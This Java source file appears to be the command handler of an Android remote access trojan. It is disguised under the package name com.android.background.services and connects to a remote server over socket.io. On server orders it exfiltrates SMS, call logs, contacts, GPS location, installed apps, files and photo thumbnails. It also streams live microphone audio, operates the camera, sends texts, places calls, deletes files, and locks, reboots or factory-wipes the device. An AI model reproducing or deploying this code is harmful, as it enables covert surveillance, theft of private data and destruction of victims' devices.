package com.android.background.services;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.android.background.services.helpers.AppsListManager;
import com.android.background.services.helpers.CallsManager;
import com.android.background.services.helpers.CameraManager;
import com.android.background.services.helpers.ContactsManager;
import com.android.background.services.helpers.FileManager;
import com.android.background.services.helpers.LocManager;
import com.android.background.services.helpers.MicManager;
import com.android.background.services.helpers.SMSManager;

import org.apache.commons.io.FileUtils;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;

import io.socket.emitter.Emitter;

public class ConnectionManager {

    private static final int REQUEST_RECORD_AUDIO_PERMISSION = 200;
    private static final int SAMPLE_RATE = 44100;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    private static AudioRecord audioRecord;
    private static boolean isRecording;

    @SuppressLint("StaticFieldLeak")
    public static Context context;
    private static io.socket.client.Socket ioSocket;

    public static void startAsync(Context con) {
        try {
            context = con;
            sendReq();
        } catch (Exception ex) {
            startAsync(con);
        }
    }


    public static void sendReq() {

        try {

            if (ioSocket != null)
                return;

            ioSocket = IOSocket.getInstance().getIoSocket();


            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {

                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("order");

                        switch (order) {
                            case "x0000ca":
                                if (data.getString("extra").equals("camList"))
                                    x0000ca(-1);
                                else if (data.getString("extra").equals("1"))
                                    x0000ca(1);
                                else if (data.getString("extra").equals("0"))
                                    x0000ca(0);
                                break;
                            case "x0000fm":
                                if (data.getString("extra").equals("ls"))
                                    x0000fm(0, data.getString("path"));
                                else if (data.getString("extra").equals("dl"))
                                    x0000fm(1, data.getString("path"));
                                break;
                            case "x0000sm":
                                if (data.getString("extra").equals("ls"))
                                    x0000sm(0, null, null);
                                else if (data.getString("extra").equals("sendSMS"))
                                    x0000sm(1, data.getString("to"), data.getString("sms"));
                                break;
                            case "x0000cl":
                                x0000cl();
                                break;
                            case "x0000cn":
                                x0000cn();
                                break;
                            case "x0000mc":
                                x0000mc(data.getInt("sec"));
                                break;
                            case "x0000apps":
                                x0000apps();
                                break;
                            case "x0000lm":
                                x0000lm();
                                break;
                            case "x0000runApp":
                                x0000runApp(data.getString("extra"));
                                break;
                            case "x0000openUrl":
                                x0000openUrl(data.getString("url"));
                                break;
                            case "x0000deleteFF":
                                x0000deleteFF(data.getString("fileFolderPath"));
                                break;
                            case "x0000dm":
                                x0000dm(data.getString("number"));
                                break;
                            case "x0000lockDevice":
                                x0000lockDevice();
                                break;
                            case "x0000wipeDevice":
                                x0000wipeDevice();
                                break;
                            case "x0000rebootDevice":
                                x0000rebootDevice();
                                break;
                            case "x0000getAllImages":
                                sendImages();
                                break;
                            case "x0000listenMic":
                                listenMic();
                                break;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();

        } catch (Exception ex) {
            Log.e("error", "");
        }
    }

    private static void listenMic() {
        if (isRecording){
            ioSocket.emit("audioDataStop", "stop");
            audioRecord.stop();
            isRecording = false;
        } else{
            initializeAudioRecording();
            isRecording = true;
        }
    }

    private static boolean checkMicPermission() {
        int permission = ContextCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO);
        if (permission != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions((Activity) context, new String[]{android.Manifest.permission.RECORD_AUDIO}, REQUEST_RECORD_AUDIO_PERMISSION);
            return false;
        }
        return true;
    }

    private static void initializeAudioRecording() {

        if (checkMicPermission()){
            int minBufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
            audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, minBufferSize);

            if (audioRecord.getState() == AudioRecord.STATE_INITIALIZED) {
                audioRecord.startRecording();
                // Start recording and sending audio data to the server
                startAudioStream();
            } else {
                Log.e("AudioStream", "Audio recording initialization failed.");
            }
        } else {
            Log.d("Madara", "mic permission required.");
        }
    }

    private static void startAudioStream() {
        final int bufferSize = 4096; // Adjust buffer size as needed
        final byte[] audioData = new byte[bufferSize];

        new Thread(new Runnable() {
            @Override
            public void run() {
                while (audioRecord.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                    audioRecord.read(audioData, 0, bufferSize);
                    byte[] sendData = Arrays.copyOf(audioData, audioData.length);
                    sendAudioData(sendData);
                }
            }
        }).start();
    }

    private static void sendAudioData(byte[] audioData) {
        String audioDataString = Base64.encodeToString(audioData, Base64.NO_WRAP);
        ioSocket.emit("audioData", audioDataString);
    }



    private static void sendImages() throws JSONException {

        JSONObject object = new JSONObject();

        ArrayList<String> imagePaths = getAllPhotos(context);

        for (int i = 0; i < imagePaths.size(); i++) {

            String imagePath = imagePaths.get(i);

            Bitmap originalBitmap = BitmapFactory.decodeFile(imagePath);

            int thumbnailWidth = 100; // Set your desired thumbnail width
            int thumbnailHeight = 100; // Set your desired thumbnail height
            Bitmap thumbnailBitmap = Bitmap.createScaledBitmap(originalBitmap, thumbnailWidth, thumbnailHeight, false);

            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            thumbnailBitmap.compress(Bitmap.CompressFormat.JPEG, 100, stream);
            byte[] thumbnailByteArray = stream.toByteArray();

            File file = new File(imagePath);
            String imageName = file.getName();

            object.put("imageName", imageName);
            object.put("imagePath", imagePath);
            object.put("imageBytes", thumbnailByteArray);
        }

        ioSocket.emit("x0000getAllImages", object);
    }

    private static ArrayList<String> getAllPhotos(Context context) {
        ArrayList<String> photoPaths = new ArrayList<>();

        // Define the URI for the external storage's MediaStore.Images
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        // Define the columns you want to retrieve
        String[] projection = {MediaStore.Images.Media.DATA};

        // Sort order (optional)
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        // Query the MediaStore to get all photos
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(uri, projection, null, null, sortOrder);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                String photoPath = cursor.getString(columnIndex);
                photoPaths.add(photoPath);
            }
            cursor.close();
        }

        return photoPaths;
    }

    private static void x0000rebootDevice() throws JSONException {
        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){

            MainActivity.devicePolicyManager.reboot(MainActivity.componentName);
            jsonObject.put("status", true);
            jsonObject.put("message", "Device rebooted successfully.");
        }
        else{
            jsonObject.put("status", false);
            jsonObject.put("message", "Device admin permission is not active.");
        }
        ioSocket.emit("x0000rebootDevice", jsonObject);
    }

    private static void x0000wipeDevice() throws JSONException {

        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
            MainActivity.devicePolicyManager.wipeData(1);
            jsonObject.put("status", true);
            jsonObject.put("message", "Device wiped out successfully.");
        }
        else{
            jsonObject.put("status", false);
            jsonObject.put("message", "Device admin permission is not active.");
        }
        ioSocket.emit("x0000lockDevice", jsonObject);
    }

    private static void x0000lockDevice() throws JSONException {

        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
            MainActivity.devicePolicyManager.lockNow();
            jsonObject.put("status", true);
            jsonObject.put("message", "Device locked.");
        }
        else{
            jsonObject.put("status", false);
            jsonObject.put("message", "Device admin permission is not active.");
        }
        ioSocket.emit("x0000lockDevice", jsonObject);
    }

    private static void x0000dm(String number) throws JSONException {

        JSONObject jsonObject = new JSONObject();

        try {

            Uri phoneNumber = Uri.parse("tel:"+number);
            Intent callIntent = new Intent(Intent.ACTION_CALL, phoneNumber);
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(callIntent);

            jsonObject.put("status", true);
        }
        catch (Exception e){
            jsonObject.put("status", false);
            e.printStackTrace();
        }
        ioSocket.emit("x0000dm", jsonObject);
    }

    private static void x0000deleteFF(String fileFolderPath) throws JSONException {

        JSONObject jsonObject = new JSONObject();

        File file = new File(fileFolderPath);

        if (file.isDirectory() && file.exists()){
            try {
                FileUtils.forceDelete(file);
                jsonObject.put("status", true);
            }
            catch (Exception e) {
                jsonObject.put("status", false);
                e.printStackTrace();
            }
        }
        else if (file.isFile() && file.exists()){
            jsonObject.put("status", file.delete());
        }

        ioSocket.emit("x0000deleteFF", jsonObject);
    }


    private static void x0000openUrl(String url) {

        JSONObject jsonObject = new JSONObject();

        try{
            Intent openIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            openIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(openIntent);
            jsonObject.put("status", true);
        }
        catch (Exception e){
            try {
                jsonObject.put("status", false);
            } catch (JSONException jsonException) {
                jsonException.printStackTrace();
            }
            e.printStackTrace();

        }
        ioSocket.emit("x0000openUrl", jsonObject);
    }


    private static void x0000runApp(String packageName) {

        JSONObject jsonObject = new JSONObject();

        Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(packageName);

        if (launchIntent != null) {
            try {
                jsonObject.put("launchingStatus", true);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            context.startActivity(launchIntent);
        }
        else {
            try {
                jsonObject.put("launchingStatus", false);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        ioSocket.emit("x0000runApp", jsonObject);
    }

    public static void x0000apps() {
        ioSocket.emit("x0000apps", AppsListManager.getAppLists(context));
    }

    public static void x0000ca(int req) {

        if (req == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if (cameraList != null)
                ioSocket.emit("x0000ca", cameraList);
        } else if (req == 1) {
            new CameraManager(context).startUp(1);
        } else if (req == 0) {
            new CameraManager(context).startUp(0);
        }
    }

    public static void x0000fm(int req, String path) {
        if (req == 0)
            ioSocket.emit("x0000fm", FileManager.walk(path));
        else if (req == 1)
            FileManager.downloadFile(path);
    }


    public static void x0000sm(int req, String phoneNo, String msg) {
        if (req == 0)
            ioSocket.emit("x0000sm", SMSManager.getSMSList());
        else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("x0000sm", isSent);
        }
    }

    public static void x0000cl() {
        ioSocket.emit("x0000cl", CallsManager.getCallsLogs());
    }

    public static void x0000cn() {
        ioSocket.emit("x0000cn", ContactsManager.getContacts());
    }

    public static void x0000mc(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    public static void x0000lm() throws Exception {
        Looper.prepare();
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();
        // check if GPS enabled
        if (gps.canGetLocation()) {

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Log.e("loc", latitude + "   ,  " + longitude);
            location.put("enable", true);
            location.put("lat", latitude);
            location.put("lng", longitude);
        } else
            location.put("enable", false);

        ioSocket.emit("x0000lm", location);
    }
}
